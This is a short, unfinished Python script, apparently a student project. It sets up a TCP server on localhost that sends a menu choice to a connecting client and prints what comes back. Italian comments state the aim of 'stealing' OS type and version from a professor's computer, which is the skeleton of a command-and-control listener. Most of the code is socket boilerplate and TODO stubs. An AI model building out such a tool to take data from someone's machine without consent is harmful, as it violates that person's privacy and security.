# default imports
import socket
import sys
import os
import time
import platform

# downloaded imports


# attributi globali
Port = 12000
IpAddr = "127.0.0.1"


#

def Menu():
    while True:
        print("What do you want to do?")
        print("1)Get All Information about the system")
        print("2)TODO")
        print("3)TODO")
        resp = input()
        if resp == "1":
            return 1
        else:
            break



def CreazioneSocket():
    global s
    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # connected with IPV4 and TCP type protocol
        #s.close()
        s.bind((IpAddr, Port))
        #s.close()
        print("Socket Successfully created and binded")  # Normally there are no problems with creating a socket
        print("Now in listening...")
        while True:
            s.listen(5)

            client, address = s.accept()  # la connessione in entrata viene splittata in 2 variabili
            print(f"Connection Established with {client}\n")

            # scegliere cosa rubare ora al computer del professore

            # Rubare:
            # 1)Tipo Di OS
            # 2)Versione OS
            # 3)
            res = Menu()
            print(res)
            if res == 1:
                client.send(str(res).encode())
                print("Message Sent!")
            else:
                pass

            message = client.recv(8192).decode()
            print("Message received!")
            print(message)
            client.close()

            time.sleep(1)#riga finale prima dell'ultima operazione



    except socket.error as err:
        print(f"Socket Creation Failed : \n{err}")
        print("What do you want to do now?\n")
        print("1)Retry\n")
        print("2)Exit\n")
        resp = input()
        if resp == "1":
            pass
        elif resp == "2":
            print("Uscita dal programma...")
            exit()
        else:
            print("Give a Correct Answer...")
            print("Restarting the request...")
            time.sleep(3)
            cls()
    finally:
        s.close()
def main():
    CreazioneSocket()



def cls():
    os.system('cls' if os.name=='nt' else 'clear')

if __name__ == "__main__":
    main()
